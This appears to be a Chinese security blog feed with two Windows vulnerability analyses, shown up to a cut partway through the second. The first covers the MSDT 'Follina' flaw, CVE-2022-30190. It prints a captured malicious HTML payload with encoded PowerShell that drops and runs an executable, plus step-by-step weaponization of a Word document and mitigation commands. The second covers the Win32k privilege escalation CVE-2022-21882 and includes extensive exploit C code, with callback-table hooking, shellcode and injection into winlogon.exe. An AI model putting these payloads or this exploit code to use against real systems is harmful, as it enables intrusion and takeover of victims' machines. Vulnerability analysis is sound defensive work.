Microsoft Windows Server 2022 (Server Core installation)
Microsoft Windows Server 2019 (Server Core installation)
Microsoft Windows 8.1
Microsoft Windows 10 20H2
Microsoft Windows 10 21H2
Microsoft Windows Server 2012 R2
Microsoft Windows 7 SP1
Microsoft Windows RT 8.1 SP0
Microsoft Windows Server 2012
Microsoft Windows 10 21H1
Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
<p><strong>RDF842l.html原始内容：</strong></p>
<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;body&gt;
&lt;script&gt;
//AAAAAAAAAAAAAAAAAAAAAAAA
//重复让整个html文件达到4096字节
    window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+  [char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
<p>解密得到</p>
<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启动隐藏窗口：</p>
<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
将Base64字符串编码的cab文件保存1.c
将1.c cab文件展开到当前目录
最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
{
    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
}
else
{
    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices

	## If the user chose the option "Not listed" we will ask them to browse for a file
    if($selectedProgram -eq "NotListed")
    {
        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
    }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
{
    $testresult = $false

    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
    {
        $testresult = test-path -literalpath $appPath

        if($testresult)
        {
            if(-not($type::IsFileProtected($appPath)))
            {
                $extension = [System.IO.Path]::GetExtension($appPath)
                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
            }
            else
            {
                $testresult = $false
                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
            }
        }
    }

    Set-Variable -name appValid -value $testResult -scope global
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
{
    $InstanceId++
    $selection = $selectedProgram
    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
    Test-Selection($selectedProgram)
}

$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
{
    $Env:RecommendedLayer = $AppInfo[2]
    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
}
else
{
    Start-Process -FilePath $AppInfo[1]
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
<p>包含$()中的代码会通过PowerShell执行</p>
<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
<p><strong>禁用方法：</strong></p>
<p>1.以管理员身份运行命令提示符</p>
<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
<p><strong>撤销禁用：</strong></p>
<p>1.以管理员身份运行命令提示符</p>
<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-21882 Win32K本地提权分析</title>
    <url>/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00漏洞描述"><a href="#0x00漏洞描述" class="headerlink" title="0x00漏洞描述"></a>0x00漏洞描述</h2><p>CVE-2022-21882漏洞是window系统的一个本地提权漏洞，微软在2022年1月份安全更新中修补了此漏洞。CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的类型混淆漏洞。漏洞成因与CVE-2021-1732类似，主要因为win32kfull!xxxClientAllocExtraBytes函数会回调用户空间中的user32!xxxClientAllocWindowClassExtraBytes,使用NtUserConsoleControl方法设置tagWNDK对象的ConsoleWindow标志，修改窗口类型。回调之后，系统不检查窗口类型是否改变，攻击者可以设置目标窗口的ExtraBytes指针为任意值，修改寻址方式为桌面堆+偏移，以实现桌面堆的越界写。</p>
<p>影响版本：</p>
<pre class="line-numbers language-none"><code class="language-none">Windows 10 Version 21H2 for x64-based Systems
Windows 10 Version 21H2 for ARM64-based Systems
Windows 10 Version 21H2 for 32-bit Systems
Windows 11 for ARM64-based Systems
Windows 11 for x64-based Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows Server 2022 (Server Core installation)
Windows Server 2022
Windows 10 Version 21H1 for 32-bit Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><h3 id="CVE-2021-1732补丁"><a href="#CVE-2021-1732补丁" class="headerlink" title="CVE-2021-1732补丁"></a>CVE-2021-1732补丁</h3><p>CVE-2021-1732的补丁是在CreateWindowEx在调用ClientAllocWindowClassExtraBytes后增加了一个检查。正常情况下在新创建一个窗口还没有调用xxxClientAllocWindowClassExtraBytes的时候，其窗口对应的tagWND -&gt; ExtraBytes是空的，通过检测目标窗口的ExtraBytes指针是否在回调过程中被修改，推测用户态回调是否被hook，如果检查到非正常修改就会释放新创建的窗口，返回失败。也就是说CVE-2021-1732的补丁打在CreateWindowEx，修复方法是在调用xxxClientAllocWindowClassExtraBytes函数后，在CreateWindowEx中判断漏洞是否被利用。</p>
<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815112448042.png"></p>
<p>但是xxxCreateAllocWindowClassExtraBytes函数并没有做任何修改。打完补丁之后，又出现的新的路径来触发xxxClientAllocWindowClassExtraBytes函数。</p>
<h3 id="win32kfull-xxxSwitchWndProc"><a href="#win32kfull-xxxSwitchWndProc" class="headerlink" title="win32kfull!xxxSwitchWndProc"></a>win32kfull!xxxSwitchWndProc</h3><p>xxxSwitchWndProc函数中调用xxxClientAllocWindowClassExtraBytes为窗口分配额外内存，后面却没有检查窗口的ExtraBytes在用户层回调过程中是否修改，因此发生了和CVE-2021-1732同样的问题，由于窗口已经创建完毕，窗口的句柄也更容易拿到，因此漏洞更容易利用。</p>
<pre class="line-numbers language-none"><code class="language-none">_int64 __fastcall xxxSwitchWndProc(struct tagWND *a1, int a2, unsigned __int64 a3, __int64 a4)
{
    *((_QWORD *)v7 + 0x23) = v15;
    *(_DWORD *)(*(_QWORD *)v8 + 0xFCi64) = v14;
    cbExtraBytes = *(unsigned int *)(*(_QWORD *)v8 + 0xC8i64);
    v28 = cbExtraBytes;
    if ( (_DWORD)cbExtraBytes )//cbExtraBytes大于0，调用xxxClientAllocWindowClassExtraBytes
    {
        ret = (void *)xxxClientAllocWindowClassExtraBytes((unsigned int)cbExtraBytes);
        if ( !ret )
            return 0i64;
    }
    else
    {
        ret = 0i64;
    }
    if ( tagWND::RedirectedFieldpExtraBytes::operator&lt;bool&gt; bool((__int64)v7 + 0x140) )// tagWND-&gt;ExtraBytes != NULL
    {
        if ( ret )
            memmove(
            ret,
            (const void *)(*(_QWORD *)(*(_QWORD *)v8 + 0x128i64) + *(unsigned int *)(*(_QWORD *)v8 + 0xFCi64)),
            cbExtraBytes);
        tagWND = *((_QWORD *)v7 + 5);
        ExtraBytes = *(_QWORD *)(tagWND + 0x128);
        *(_QWORD *)(tagWND + 0x128) = ret;
        *(_DWORD *)(*((_QWORD *)v7 + 5) + 0xC8i64) = cbExtraBytes;
        xxxClientFreeWindowClassExtraBytes((__int64)v7, ExtraBytes);
    }
}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815162914670.png"></p>
<p>应用层可以通过调用NtUserMessageCall函数触发内核层的xxxSwitchWndProc函数，接着就会调用到xxxClientAllocWindowClassExtraBytes。事先在应用层hook相应的回调函数，然后调用函数NtUserConsoleControl修改tagWND_Trigger的ExtraBytes内存寻址方式为桌面堆+偏移，调用NtCallbackReturn将窗口相对桌面堆的偏移tagWND_Victim offset设置为tagWND_Trigger - &gt; ExtraBytes，Hook应用层的User32!xxxClientFreeWindowClassExtraBytes,使其不释放tagWND_Trigger -&gt; ExtraBytes。</p>
<p>触发漏洞窗口hTrigger和受害者窗口hVictim在内存上的布局：按照利用流程修改hTrigger的tagWND-&gt;Flags |= 0x800,设置tagWND_Victim相对与桌面堆的偏移为Trigger-&gt;ExtraBytes,然后对hWndTrigger调用SetWindowLong系列函数，越界修改Victim-&gt;ExtraBytes为任意内存，再对hWndVictim调用SetWindowLong系列函数任意内存写，获得任意内核地址写之后，修改当前进程的Token -&gt; Privileges,最后恢复Victim -&gt; ExtraBytes和Trigger -&gt; Flags，避免BSOD。</p>
<h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><pre class="line-numbers language-none"><code class="language-none">##include&lt;windows.h&gt;
##include&lt;stdio.h&gt;
##include&lt;stdlib.h&gt;
##include &lt;Psapi.h&gt;
##pragma comment(lib, "Psapi.lib ")

##define KERNEL_CALLBACK_TABLE_OFFSET 0x58
##define TRIGGERWND_EXTRASIZE 0xABCD
##define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L) 

##pragma pack(1)
typedef struct 
{
    ULONG64 hWnd;                // + 0x00
    ULONG64 OffsetToDesktopHeap; // + 0x08
    ULONG64 state;               // + 0x10
    DWORD dwExStyle;             // + 0x18
    DWORD dwStyle;               // + 0x1C
    BYTE padd1[0xa8];
    ULONG64 cbWndExtra;          // + 0xC8
    BYTE padd2[0x18];
    DWORD dwExtraFlag;           // + 0xE8
    BYTE padd3[0x3c];
    ULONG64 pExtraBytes;         // + 0x128
}tagWNDK,*PWND;

##pragma pack(0)

typedef struct _SYSTEM_HANDLE
{
    PVOID Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR HandleCount;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

enum SYSTEM_INFORMATION_CLASS {
    SystemExtendedHandleInformation = 64
};

using NtUserMessageCall_t = NTSTATUS(*)(
    HWND hWnd,
    UINT Msg,
    WPARAM wParam,
    LPARAM lParam,
    ULONG_PTR ResultInfo,
    DWORD dwType,
    BOOL bAnsi);

using ZwQuerySystemInformation_t = NTSTATUS(*)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

using RtlAllocateHeap_t = PVOID(*)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);

using xxxClientAllocWindowClassExtraBytes_t = NTSTATUS(*)(PDWORD Length);
using xxxClientFreeWindowClassExtraBytes_t = NTSTATUS(*WINAPI)(PVOID* pInfo);

using NtUserConsoleControl_t = NTSTATUS(__fastcall*)(DWORD64, LPVOID, DWORD);
using NtCallbackReturn_t = NTSTATUS(__fastcall*)(LPVOID, DWORD, NTSTATUS);
using HMValidateHandle_t = tagWNDK*(__fastcall*)(HANDLE, UINT);
using IsMenu_t = BOOL(*)(HMENU hMenu);

namespace gb {
    xxxClientAllocWindowClassExtraBytes_t xxxClientAllocWindowClassExtraBytes = 0;
    xxxClientFreeWindowClassExtraBytes_t xxxClientFreeWindowClassExtraBytes = 0;
    NtUserConsoleControl_t NtUserConsoleControl = 0;
    NtCallbackReturn_t NtCallbackReturn = 0;
    HMValidateHandle_t HMValidateHandle = 0;
    NtUserMessageCall_t  NtUserMessageCall = 0;
    ZwQuerySystemInformation_t ZwQuerySystemInformation = 0;
    RtlAllocateHeap_t RtlAllocateHeap = 0;

    IsMenu_t u32_IsMenu = 0;
    HMODULE g_hNtdll = 0;
    HMODULE g_hWin32u = 0;
    HMODULE g_hUser32 = 0;

    HWND g_hTriggerWnd = 0;
    HWND g_hVictimWnd = 0;

    DWORD64 TriggerDeskHeap = 0;
    DWORD64 VictimDeskHeap = 0;
    HANDLE hToken = 0;
};


VOID SetFuncHook(DWORD64 newAllocFunc,DWORD64 newFreeFunc) {
    //1.获取本进程的PEB
    DWORD64 ulCurrPEB = __readgsqword(0x60);
    printf("[+] Found ulCurrPEB = 0x%p\n", ulCurrPEB);
    //2.找到KernelCallbackTable
    DWORD64 KernelCallbackTable = ulCurrPEB + KERNEL_CALLBACK_TABLE_OFFSET;
    KernelCallbackTable = *(PDWORD64)KernelCallbackTable;
    printf("[+] Found KernelCallbackTable = 0x%p\n", KernelCallbackTable);
    DWORD64  xxxClientAllocExtraBytesFunc = *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8);
    printf("[+] Found xxxClientAllocExtraBytesFunc = 0x%p\n", xxxClientAllocExtraBytesFunc);
    gb::xxxClientAllocWindowClassExtraBytes = (xxxClientAllocWindowClassExtraBytes_t)xxxClientAllocExtraBytesFunc;

    DWORD64  xxxClientFreeExtraBytesFunc = *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7C * 8);
    printf("[+] Found xxxClientFreeExtraBytesFunc = 0x%p\n", xxxClientFreeExtraBytesFunc);
    gb::xxxClientFreeWindowClassExtraBytes = (xxxClientFreeWindowClassExtraBytes_t)xxxClientFreeExtraBytesFunc;

    //3.HOOK
    //首先需要设置页面可写属性
    DWORD dwOldProtect;
    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
    *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8) = newAllocFunc;
    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, dwOldProtect, &amp;dwOldProtect);

    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7C * 8), 0x300, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
    *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7C * 8) = newFreeFunc;
    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7C * 8), 0x300, dwOldProtect, &amp;dwOldProtect);
}

NTSTATUS WINAPI ClientFreeWindowsClassExtraBytesProxy(PVOID* pInfo) {
    PWND pwnd = (PWND)pInfo[0];
    if (pwnd-&gt;cbWndExtra == TRIGGERWND_EXTRASIZE)
        return 1;
    return gb::xxxClientFreeWindowClassExtraBytes(pInfo);
}

NTSTATUS WINAPI ClientAllocatWindowClassExtraBytesProxy(PDWORD size) {
    
    if (*size==TRIGGERWND_EXTRASIZE) {
        //获取窗口句柄
        //使用NtUserConsoleControl 将目标窗口的寻址模式修改为DesktopHeap+Offset
        printf("[+] ClientAllocatWindowClassExtraBytesProxy called! Offset = %p\n\n", gb::VictimDeskHeap);
        gb::NtUserConsoleControl(6, &amp;gb::g_hTriggerWnd, 0x10);
        //修改hWndTriggle 的 tagWnd-&gt;ExtraBytes 为 hTriggerWnd的桌面堆
        DWORD64 ulResult = gb::VictimDeskHeap ;
        return gb::NtCallbackReturn(&amp;ulResult, 24, 0);
    }
    return gb::xxxClientAllocWindowClassExtraBytes(size);
}

LRESULT __fastcall WindowProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
{
    if (a2 != 2)
        return DefWindowProcW(a1, a2, a3, a4);
    PostQuitMessage(0);
    return 0;
}

bool CheckPrivilege(HANDLE TokenHandle)
{
    BOOL isPrivilegeSet = FALSE;
    PRIVILEGE_SET       privSet;
    LUID_AND_ATTRIBUTES Privileges[1];
    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &amp;(Privileges[0].Luid));
    Privileges[0].Attributes = 0;

    privSet.PrivilegeCount = 1;
    privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
    memcpy(privSet.Privilege, Privileges, sizeof(Privileges));

    PrivilegeCheck(TokenHandle, &amp;privSet, &amp;isPrivilegeSet);
    return isPrivilegeSet;
}

DWORD getProcessId(const char* name)
{
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &amp;cbNeeded))
    {
        printf("[Error_%d] EnumProcess failed...\n", __LINE__);
        exit(0);
    }


    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.
    for (i = 0; i &lt; cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            DWORD processID = aProcesses[i];
            CHAR szProcessName[MAX_PATH] = "&lt;unknown&gt;";

            // Get a handle to the process.

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                PROCESS_VM_READ,
                FALSE, processID);

            // Get the process name.

            if (NULL != hProcess)
            {
                HMODULE hMod;
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, &amp;hMod, sizeof(hMod),
                    &amp;cbNeeded))
                {
                    GetModuleBaseNameA(hProcess, hMod, szProcessName,
                        sizeof(szProcessName) / sizeof(TCHAR));
                }
            }

            // Print the process name and identifier.
            if (!lstrcmpA(szProcessName, name))
            {
                CloseHandle(hProcess);
                return (processID);
            }

            // Release the handle to the process.

            CloseHandle(hProcess);
        }
    }

    return 0;

}

void SpawnShell() {
    HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
    PVOID  pLibRemote;
    HMODULE hKernel32 = GetModuleHandleA("Kernel32");
    DWORD processID;
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
        "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
        "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
        "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
        "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
        "\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
        "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
        "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
        "\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
        "\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
        "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
        "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
        "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
        "\x78\x65\x00";


    if ((processID = getProcessId("winlogon.exe")) == 0)
    {
        printf("[Error_%d] Couldn't retrieve process ID...\n", __LINE__);
        return;
    }
    printf("[+] Retrieved process id: %d\n", processID);
    hSystemProcess = OpenProcess(GENERIC_ALL, false, processID);

    if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
    {
        printf("[Error_%d] Couldn't open system process...\n", __LINE__);
        return;
    }
    printf("[+] Got a handle on a system Process: %08p\n", hSystemProcess);


    pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!pLibRemote)
    {
        printf("[Error_%d] Virtual alloc failed !\n", __LINE__);
        return;
    }

    printf("[+] Allocation in system process succeded with address %08p\n", pLibRemote);

